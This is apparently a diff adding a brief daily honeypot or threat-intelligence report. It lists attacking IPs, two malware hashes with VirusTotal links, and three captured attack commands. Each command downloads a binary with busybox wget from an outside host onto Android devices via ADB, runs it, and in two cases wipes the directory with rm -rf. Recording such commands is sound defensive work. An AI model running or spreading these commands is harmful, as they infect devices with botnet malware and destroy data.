@@ -1,0 +1,19 @@
+Top 5 IPs for 2024-01-04:
+
+171.118.203.99
+186.179.211.217
+174.50.111.248
+121.122.88.205
+175.4.197.100
+
+Malware download: 
+3e8b16d5a385cf6c4da6e8d1b7d7ae8ecea08132c1c61fe21aa914432411a067
+https://www.virustotal.com/gui/file/3e8b16d5a385cf6c4da6e8d1b7d7ae8ecea08132c1c61fe21aa914432411a067
+533775b86d8c4674b995ee08ad1394702e2cda7d5aa5ce98dac14dbd25d85f7b
+https://www.virustotal.com/gui/file/533775b86d8c4674b995ee08ad1394702e2cda7d5aa5ce98dac14dbd25d85f7b
+
+Malicious commands seen:
+
+cd /data/local/tmp/; busybox wget http://45.157.11.10/rus.arm7; chmod 777 rus.arm7; ./rus.arm7 ADB; rm -rf *
+cd /data/local/tmp/; rm *; busybox wget http://cnc.catairlines.net/arm7; chmod 777 arm7; ./arm7 adb
+cd /data/local/tmp/; busybox wget http://2.58.113.242/popbang.arm7; chmod 777 popbang.arm7; ./popbang.arm7 taco; rm -rf *
